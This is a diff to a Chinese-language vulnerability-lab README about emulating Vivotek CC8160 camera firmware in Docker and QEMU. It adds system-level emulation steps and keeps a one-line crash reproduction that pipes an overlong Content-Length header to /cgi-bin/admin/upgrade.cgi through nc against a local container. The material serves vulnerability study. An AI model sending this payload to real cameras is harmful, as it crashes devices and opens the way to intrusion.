@@ -3,6 +3,8 @@
 
 ## 漏洞环境
 
+### 用户级模拟 - 快速验证
+
 手动构建：
 
 ```sh
@@ -31,10 +33,31 @@ $ docker pull firmianay/vivotek:cc8160
 $ docker run --privileged -p 1234:80 -dit vivotek:cc816
 ```
 
+### 系统级模拟 - 动态调试
+
+手动构建：
+
+```sh
+# 解包过程同上
+
+# 先构建漏洞环境 qemu-system:arm 环境
+$ cd baseImage/qemu-system/arm
+$ docker build -t qemu-system:arm .
+
+# 再构建漏洞环境
+$ docker build -t vivotek:cc8160-sys .
+
+# 启动环境
+$ docker run --privileged -it vivotek:cc816
+# 等待启动完成，重新开启一个窗口做后续操作
+$ docker exec -it [CONTAINER ID] /bin/bash
+$ ssh root@192.168.2.2
+```
+
 ## 漏洞复现
 
 ```sh
-echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 127.0.0.1 1234
+echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | nc -v 127.0.0.1 1234
 ```
 
 ![img](./crash.png)
